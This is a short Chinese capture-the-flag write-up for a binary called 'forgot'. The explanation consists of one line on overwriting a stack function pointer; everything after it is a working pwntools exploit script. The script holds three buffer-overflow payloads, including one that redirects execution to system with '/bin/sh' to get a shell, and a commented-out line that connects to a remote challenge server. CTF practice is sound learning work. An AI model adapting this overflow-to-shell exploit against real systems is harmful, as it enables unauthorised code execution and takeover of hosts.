# forgot

此题关键在于：用恶意代码地址覆盖栈中的函数地址。

由于代码逻辑原因，前几个字符不同会造成调用的函数地址不同，因此偏移也不同。

列出三种有代表性的payload。

## writeup

```python
import pwn
  
pwn.context(arch='i386', os='linux')

payload  = b'a@a.' + b'a' * 0x40 + b'\xcc\x86\x04\x08'      
payload2 = b'AAAA' + b'A' * 0x1c + b'\xcc\x86\x04\x08'      

e = pwn.ELF('./forgot')
system_addr = pwn.p32(e.sym['system'])
payload3 = b'/bin/sh\x00' + b'A' * 28 + system_addr

p = pwn.process('./forgot')
#p = pwn.remote('220.249.52.133', 38432)

p.sendlineafter(b'> ', b'PPW')
p.sendlineafter(b'> ', payload)

p.interactive()
```